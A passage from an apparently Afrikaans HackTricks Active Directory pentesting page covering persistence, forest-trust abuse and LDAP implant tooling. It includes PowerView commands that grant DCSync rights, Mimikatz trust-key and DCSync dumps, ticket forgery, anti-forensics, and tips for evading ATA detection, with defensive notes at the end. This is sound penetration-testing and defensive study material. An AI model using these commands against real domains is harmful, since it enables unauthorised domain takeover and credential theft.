Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Maak gebruikers kwesbaar vir [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Gee [**DCSync**](#dcsync) voorregte aan 'n gebruiker

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Die **Silver Ticket-aanval** skep 'n **legitimate Ticket Granting Service (TGS) ticket** vir 'n spesifieke diens deur die gebruik van die **NTLM hash** (bv. die **hash van die PC-rekening**). Hierdie metode word gebruik om **toegang tot daardie diens se voorregte** te kry.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

'n **Golden Ticket-aanval** behels dat 'n aanvaller toegang kry tot die **NTLM hash van die krbtgt-rekening** in 'n Active Directory-omgewing. Hierdie rekening is spesiaal omdat dit gebruik word om alle **Ticket Granting Tickets (TGTs)** te teken, wat noodsaaklik is vir verifikasie binne die AD-netwerk.

Sodra die aanvaller hierdie hash bekom, kan hulle **TGTs** skep vir enige rekening wat hulle kies (Silver ticket-aanval).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hierdie is soos golden tickets, maar vervalste op 'n wyse wat **algemene deteksie-meganismes vir golden tickets omseil.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Om sertifikate van 'n rekening te hê of in staat te wees om dit aan te vra** is 'n uitstekende manier om in 'n gebruiker se rekening te bly (selfs al verander hulle die wagwoord):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Deur sertifikate te gebruik is dit ook moontlik om met hoë voorregte binne die domein persistent te wees:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Die **AdminSDHolder**-objek in Active Directory verseker die veiligheid van **bevoorregte groepe** (soos Domain Admins en Enterprise Admins) deur 'n standaard **Access Control List (ACL)** oor hierdie groepe toe te pas om ongemagtigde veranderinge te voorkom. Hierdie funksie kan egter misbruik word; indien 'n aanvaller die AdminSDHolder se ACL wysig om volledige toegang aan 'n normale gebruiker te gee, kry daardie gebruiker uitgebreide beheer oor alle bevoorregte groepe. Hierdie veiligheidsmeganisme, bedoel om te beskerm, kan dus omgedraai word en ongereguleerde toegang moontlik maak tensy dit noukeurig gemonitor word.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

In elke **Domain Controller (DC)** bestaan 'n **lokale administrator**-rekening. Deur adminregte op so 'n masjien te bekom, kan die plaaslike Administrator-hash met **mimikatz** uitgehaal word. Daarna is 'n registerwysiging nodig om **die gebruik van hierdie wagwoord moontlik te maak**, wat remote toegang tot die lokale Administrator-rekening toelaat.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Jy kan **sekere spesiale permissies** aan 'n **gebruiker** gee oor spesifieke domeinobjekte wat die gebruiker in staat sal stel om in die toekoms **voorregte te eskaleer**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **security descriptors** word gebruik om die **permissies** wat 'n **objek** oor 'n ander **objek** het, te **berg**. As jy net 'n **klein verandering** in die **security descriptor** van 'n objek kan maak, kan jy baie interessante voorregte oor daardie objek verkry sonder om lid van 'n bevoorregte groep te wees.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Misbruik die `dynamicObject` auxiliary class om kortstondige principals/GPOs/DNS-rekords met `entryTTL`/`msDS-Entry-Time-To-Die` te skep; hulle self-verwyder sonder tombstones, wat LDAP-bewyse uitvee terwyl hulle weeslike orphan SIDs, gebroke `gPLink`-verwysings, of gecachede DNS-antwoorde agterlaat (bv. AdminSDHolder ACE-pollusie of kwaadwillige `gPCFileSysPath`/AD-geïntegreerde DNS-omleidings).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verander **LSASS** in geheue om 'n **universele wagwoord** te stel, wat toegang tot alle domeinrekeninge gee.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Leer wat 'n SSP (Security Support Provider) is hier.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Jy kan jou **eie SSP** skep om **credentials** wat gebruik word om die masjien te bereik **in clear text** te **vang**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dit registreer 'n **nuwe Domain Controller** in die AD en gebruik dit om attributes te **push** (SIDHistory, SPNs...) op gespesifiseerde objekte **sonder** om enige **log-lêers** oor die **wysigings** te laat. Jy **het DA** voorregte nodig en moet binne die **root domain** wees.\
Let daarop dat as jy verkeerde data gebruik, nogal lelike logs kan verskyn.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Vroeër het ons bespreek hoe om voorregte op te eskaleer indien jy **genoeg permission het om LAPS-wagwoorde te lees**. Hierdie wagwoorde kan ook gebruik word om **persistentie** te handhaaf.\
Kyk:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft sien die **Forest** as die sekuriteitsgrens. Dit impliseer dat **die kompromittering van 'n enkele domein moontlik tot die kompromittering van die hele Forest kan lei**.

### Basic Information

'n [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is 'n sekuriteitsmeganisme wat 'n gebruiker van een **domein** toelaat om hulpbronne in 'n ander **domein** te bereik. Dit skep 'n skakel tussen die verifikasie-stelsels van die twee domeine, wat verifikasie-sessies glad laat vloei. Wanneer domeine 'n trust opstel, wissel hulle en stoor spesifieke **sleutels** in hul **Domain Controllers (DCs)**, wat krities is vir die integriteit van die trust.

In 'n tipiese scenario, as 'n gebruiker 'n diens in 'n **vertroude domein** wil gebruik, moet hulle eers 'n spesiale ticket, 'n **inter-realm TGT**, van hul eie domein se DC versoek. Hierdie TGT is versleuteld met 'n gedeelde **sleutel** wat deur beide domeine aanvaar is. Die gebruiker bied dan hierdie TGT aan die **DC van die vertroude domein** om 'n service ticket (**TGS**) te kry. Nadat die vertroude domein se DC die inter-realm TGT valideer, gee dit 'n TGS uit wat die gebruiker toegang tot die diens verleen.

**Stappe**:

1. 'n **Client-rekenaar** in **Domain 1** begin die proses deur sy **NTLM hash** te gebruik om 'n **Ticket Granting Ticket (TGT)** by sy **Domain Controller (DC1)** te versoek.
2. DC1 gee 'n nuwe TGT as die kliënt suksesvol geverifieer is.
3. Die kliënt versoek dan 'n **inter-realm TGT** van DC1, wat benodig word om hulpbronne in **Domain 2** te bereik.
4. Die inter-realm TGT is versleuteld met 'n **trust key** wat deur DC1 en DC2 gedeel word as deel van die tweerigting domain trust.
5. Die kliënt neem die inter-realm TGT na **Domain 2 se Domain Controller (DC2)**.
6. DC2 verifieer die inter-realm TGT met sy gedeelde trust key en, indien geldig, gee dit 'n **Ticket Granting Service (TGS)** uit vir die bediener in Domain 2 wat die kliënt wil toegang.
7. Uiteindelik bied die kliënt hierdie TGS aan die bediener, wat met die bediener se rekening-hash versleuteld is, om toegang tot die diens in Domain 2 te kry.

### Different trusts

Dit is belangrik om op te let dat **'n trust 1-weg of 2-weg kan wees**. In die twee-weg opsie vertrou beide domeine mekaar, maar in die **1-weg** trustverhouding sal een van die domeine die **trusted** en die ander die **trusting** domein wees. In laasgenoemde geval sal **jy slegs in staat wees om hulpbronne binne die trusting domein van die trusted een te bereik**.

As Domain A Domain B vertrou, is A die trusting domein en B die trusted een. Verder sal dit in **Domain A** 'n **Outbound trust** wees; en in **Domain B** 'n **Inbound trust**.

**Verskillende trusting-verhoudings**

- **Parent-Child Trusts**: Dit is 'n algemene opstelling binne dieselfde forest, waar 'n child-domein outomaties 'n twee-weg transitive trust met sy parent-domein het. Dit beteken in wese dat verifikasieversoeke glad tussen die parent en die child kan vloei.
- **Cross-link Trusts**: Genoem "shortcut trusts," hierdie word geskep tussen child-domeine om verwysingsprosesse te versnel. In komplekse forests moet verifikasieverwysings tipies opreis na die forest root en dan af na die teikendomein. Deur cross-links te skep, word die reis verkort, wat veral voordelig is in geografies verspreide omgewings.
- **External Trusts**: Hierdie word ingestel tussen verskillende, nie-verwante domeine en is van aard nie-transitief nie. Volgens [Microsoft se dokumentasie](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) is external trusts nuttig om hulpbronne in 'n domein buite die huidige forest te bereik wat nie deur 'n forest trust verbind is nie. Sekuriteit word versterk deur SID-filtering met external trusts.
- **Tree-root Trusts**: Hierdie trusts word outomaties gevestig tussen die forest root-domein en 'n nuut bygevoegde boomwortel. Alhoewel dit nie algemeen voorkom nie, is tree-root trusts belangrik vir die toevoeging van nuwe domeinboome aan 'n forest, wat hulle in staat stel om 'n unieke domeinnaam te behou en twee-weg transitivity te handhaaf. Meer inligting is beskikbaar in [Microsoft se gids](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Hierdie tipe trust is 'n twee-weg transitive trust tussen twee forest root-domeine, en implementeer SID-filtering om sekuriteitsmaatreëls te verbeter.
- **MIT Trusts**: Hierdie trusts word gevestig met nie-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos-domeine. MIT trusts is meer gespesialiseerd en is geskik vir omgewings wat integrasie met Kerberos-gebaseerde stelsels buite die Windows-ekosisteem vereis.

#### Ander verskille in **trusting relationships**

- 'n trustverhouding kan ook **transitief** wees (A vertrou B, B vertrou C, dan vertrou A C) of **nie-transitief** wees.
- 'n trustverhouding kan ingestel word as **bidirectional trust** (albei vertrou mekaar) of as **one-way trust** (slegs een vertrou die ander).

### Attack Path

1. **Enumereer** die trusting-verhoudings
2. Kyk of enige **security principal** (user/group/computer) **access** het tot hulpbronne van die **ander domein**, moontlik deur ACE-inskrywings of deur in groepe van die ander domein te wees. Soek na **verhoudings oor domeine heen** (die trust is waarskynlik hiervoor geskep).
1. kerberoast in hierdie geval kan 'n ander opsie wees.
3. **Kompromitteer** die **rekeninge** wat deur die domeine kan **pivot**.

Aanvallers kan toegang tot hulpbronne in 'n ander domein kry via drie primêre meganismes:

- **Local Group Membership**: Principals kan by plaaslike groepe op masjiene gevoeg word, soos die “Administrators” groep op 'n bediener, wat hulle aansienlike beheer oor daardie masjien gee.
- **Foreign Domain Group Membership**: Principals kan ook lede van groepe binne die vreemde domein wees. Die effektieweheid van hierdie metode hang egter af van die aard van die trust en die omvang van die groep.
- **Access Control Lists (ACLs)**: Principals kan spesifiseer wees in 'n **ACL**, veral as entiteite in **ACEs** binne 'n **DACL**, wat hulle toegang tot spesifieke hulpbronne gee. Vir meer insig in die meganika van ACLs, DACLs en ACEs, is die whitepaper getiteld “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 'n waardevolle bron.

### Vind eksterne gebruikers/groepe met permissies

Jy kan kyk by **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** om vreemde sekuriteitsprincipals in die domein te vind. Hierdie sal gebruikers/groepe van **'n eksterne domein/forest** wees.

Jy kan dit in **Bloodhound** nagaan of met powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Ander maniere om domain trusts te enumerate:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Daar is **2 vertroude sleutels**, een vir _Child --> Parent_ en nog een vir _Parent_ --> _Child_.\
> Jy kan die een wat deur die huidige domein gebruik word sien met:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaleer as Enterprise admin na die child/parent domain deur die trust te misbruik met SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Dit is kritiek om te verstaan hoe die Configuration Naming Context (NC) misbruik kan word. Die Configuration NC dien as 'n sentrale bewaarplek vir konfigurasiedata oor 'n forest in Active Directory (AD)-omgewings. Hierdie data word na elke Domain Controller (DC) binne die forest gerepliseer, en skryfbare DCs handhaaf 'n skryfbare kopie van die Configuration NC. Om dit te benut, moet jy **SYSTEM privileges on a DC** hê, by voorkeur op 'n child DC.

**Link GPO to root DC site**

Die Configuration NC se Sites container bevat inligting oor die sites van alle domain-joined computers binne die AD forest. Deur met SYSTEM privileges op enige DC te werk, kan aanvallers GPOs koppel aan die root DC sites. Hierdie aksie kan die root domain moontlik kompromitteer deur die beleid wat op hierdie sites toegepas word te manipuleer.

Vir diepgaande inligting kan mens navorsing oor [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) raadpleeg.

**Compromise any gMSA in the forest**

Een aanvalsvector behels die teiken van bevoorregte gMSAs binne die domain. Die KDS Root key, noodsaaklik vir die berekening van gMSA-wagwoorde, word binne die Configuration NC gestoor. Met SYSTEM privileges op enige DC is dit moontlik om toegang tot die KDS Root key te kry en die wagwoorde vir enige gMSA oor die hele forest te bereken.

Gedetaileerde analise en stap-vir-stap gids is te vind in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Aanvullende delegated MSA-aanval (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Addisionele eksterne navorsing: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Hierdie metode vereis geduld en om te wag vir die skepping van nuwe bevoorregte AD objects. Met SYSTEM privileges kan 'n aanvaller die AD Schema wysig om enige gebruiker volle beheer oor alle classes te gee. Dit kan lei tot ongemagtigde toegang en beheer oor nuut geskepte AD objects.

Verdere leesstof is beskikbaar by [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-kwesbaarheid mik op beheer oor Public Key Infrastructure (PKI) objects om 'n sertifikaattemplaat te skep wat autentisering as enige gebruiker binne die forest moontlik maak. Aangesien PKI objects in die Configuration NC woon, maak die kompromittering van 'n skryfbare child DC die uitvoer van ESC5-aanvalle moontlik.

Meer besonderhede is beskikbaar in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenario's sonder ADCS het die aanvaller die vermoë om die nodige komponente self op te stel, soos bespreek in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In hierdie scenario word **jou domein deur 'n eksterne domein vertrou**, wat jou **onbepaalde bevoegdhede** daaroor gee. Jy sal moet uitvind **watter principals van jou domein watter toegang tot die eksterne domein het** en dan probeer dit uit te buit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterne Forest-domein - Eenrigting (Uitgaand)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In hierdie scenario **jou domein** **vertrou** sekere **voorregte** aan 'n **principal** van 'n **ander domein**.

Wanneer 'n **domein deur die vertrouende domein vertrou word**, skep die vertroude domein 'n **gebruiker** met 'n **voorspelbare naam** wat as **wagwoord die vertroude wagwoord** gebruik. Dit beteken dat dit moontlik is om 'n **gebruiker van die vertrouende domein te gebruik om toegang tot die vertroude domein te kry** om dit te enumereer en te probeer meer voorregte te verwerf:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog 'n manier om die vertroude domein te kompromitteer is om 'n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **omgekeerde rigting** van die domeinvertrouenskap geskep is (wat nie baie algemeen is nie).

Nog 'n manier om die vertroude domein te kompromitteer is om op 'n masjien te wag waar 'n **gebruiker van die vertroude domein toegang het** om via **RDP** aan te meld. Dan kan die aanvaller kode in die RDP-sessie proses inspuit en **van daar af toegang tot die oorspronklike domein van die slagoffer kry**.\
Verder, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanaf die **RDP-sessie** proses **backdoors** in die **opstartgids van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigasie van domeinvertrou-misbruik

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history attribuut oor forest trusts benut, word gemitigateer deur SID Filtering, wat standaard geaktiveer is op alle inter-forest trusts. Dit berus op die aanname dat intra-forest trusts veilig is, deur die forest in plaas van die domein as die sekuriteitsgrens te beskou volgens Microsoft se standpunt.
- Daar is egter 'n kink in die kabel: SID Filtering kan toepassings en gebruikers toegang versteur, wat soms tot die deaktivering daarvan lei.

### **Selective Authentication:**

- Vir inter-forest trusts verseker die gebruik van Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan is eksplisiete toestemmings vereis vir gebruikers om toegang tot domeine en bedieners binne die vertrouende domein of forest te kry.
- Dit is belangrik om te let dat hierdie maatreëls nie beskerming bied teen die uitbuiting van die writable Configuration Naming Context (NC) of teen aanvalle op die trust account nie.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-gebaseerde AD-misbruik vanaf on-host implante

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP-primitive as x64 Beacon Object Files wat heeltemal binne 'n on-host implant (bv. Adaptix C2) loop. Operateurs kompileer die pakket met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Al die verkeer ry oor die huidige aanmeld-sekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met auto certificate trust, so geen socks proxies of skyf-artefakte is nodig nie.

### Implant-kant LDAP-enumerering

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` los kort name/OU-paaie op in volle DNs en dump die ooreenstemmende objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` haal arbitrêre attributte (insluitend security descriptors) plus die forest/domain metadata vanaf `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` openbaar roasting candidates, delegation settings, en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors direk vanaf LDAP.
- `get-acl` en `get-writable --detailed` parseer die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes), en erfenis te lys, wat onmiddellike teikens vir ACL privilege escalation gee.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write-primitiewe vir eskalasie en persistensie

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operateur toe om nuwe principals of masjienrekeninge te stadian waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute`, en `set-attribute` kap teikens direk sodra write-property-regte gevind word.
- ACL-gefokusde opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, en `add-dcsync` vertaal WriteDACL/WriteOwner op enige AD-objek in wagwoordherstel, groepledebeheer, of DCSync-replikasievoorregte sonder om PowerShell/ADSI-artefakte te laat. `remove-*` teenstücke ruim ingespuite ACEs skoon.

### Delegasie, roasting, en Kerberos-misbruik

- `add-spn`/`set-spn` maak onmiddellik 'n gekompromitteerde gebruiker Kerberoastable; `add-asreproastable` (UAC-skeakel) merk dit vir AS-REP roasting sonder om die wagwoord te verander.
- Delegasie-makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-vlagte, of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalswege moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory-inspuiting, OU-herverskikking, en aanvalsoppervlaktevorming

- `add-sidhistory` inspuit bevoorregte SIDs in 'n beheerde principal se SID-history (see [SID-History Injection](sid-history-injection.md)), wat sluipende toegangserfenis bied heeltemal oor LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, en laat 'n aanvaller toe om bates na OUs te skuif waar gedelegeerde regte reeds bestaan voordat `set-password`, `add-groupmember`, of `add-spn` misbruik word.
- Styf gegrensde verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) laat vinnige rollback toe nadat die operateur kredensiale of persistensie geoog het, en minimaliseer telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Dit word aanbeveel dat Domain Admins slegs op Domain Controllers aangeteken mag word en nie op ander hosts gebruik word nie.
- **Service Account Privileges**: Dienste moet nie met Domain Admin (DA) voorregte uitgevoer word nie om sekuriteit te behou.
- **Temporal Privilege Limitation**: Vir take wat DA-voorregte benodig, moet hul duur beperk word. Dit kan bereik word met: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Oudit Event IDs 2889/3074/3075 en dwing dan LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementering van bedrog behels die opstel van lokvalle, soos decoy users of computers, met kenmerke soos wagwoorde wat nie verval nie of wat as Trusted for Delegation gemerk is. 'n Gedetailleerde benadering sluit in die skep van gebruikers met spesifieke regte of die toevoeging van hulle tot hoë-privilegie-groepe.
- 'n Praktiese voorbeeld behels die gebruik van gereedskap soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van bedrogtegnieke is te vinde by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdachte aanduiders sluit in atypiese ObjectSID, seldsame aanmeldings, skeppingsdatums, en lae aantalle slegte wagwoorde.
- **General Indicators**: Die vergelyking van attributte van potensiële decoy-objekte met dié van egte kan inkonsekwenthede openbaar. Gereedskap soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke bedrog te identifiseer.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy sessie-enumerasie op Domain Controllers om ATA-detektering te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes** sleutels vir ticket-voorlegging help om deteksie te ontduik deur nie na NTLM af te skaal nie.
- **DCSync Attacks**: Dit word aanbeveel om vanaf 'n nie-Domain Controller uit te voer om ATA-detektering te vermy, aangesien direkte uitvoering vanaf 'n Domain Controller waarskuwings sal veroorsaak.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
